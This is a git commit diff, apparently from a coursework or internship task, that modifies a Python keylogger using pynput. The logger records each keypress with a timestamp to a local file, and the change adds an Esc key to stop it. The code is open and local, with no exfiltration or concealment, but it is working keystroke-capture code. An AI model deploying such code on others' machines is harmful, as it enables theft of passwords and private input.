a04eaf355e1dace184d4daa201ce8ccca63fbf20
Pracheta Patil <prachetavpatil@gmail.com>
2025-01-24 15:08:25 +0530

    ADDED

--- Task_04.py
+++ Task_04.py
@@ -1,18 +1,31 @@
 from pynput import keyboard
 import time
+import threading
+
+listener_running = True
 
 def on_key_press(key):
+    global listener_running
     with open("keylog.txt", "a") as log_file:
         timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
         log_file.write(f"{timestamp} - {key}\n")
+    
+    if key == keyboard.Key.esc:
+        listener_running = False
+        return False  
 
 def main():
-    print("Press Ctrl+C to stop logging.")
-    try:
-        with keyboard.Listener(on_press=on_key_press) as listener:
-            listener.join()
-    except KeyboardInterrupt:
-        print("\nLogging stopped.")
+    global listener_running
+    print("Press 'Esc' to stop logging.")
+    
+    listener = keyboard.Listener(on_press=on_key_press)
+    listener.start()
+    
+    while listener_running:
+        time.sleep(1)
+
+    listener.stop()
+    print("\nLogging stopped...")
 
 if __name__ == "__main__":
     main()
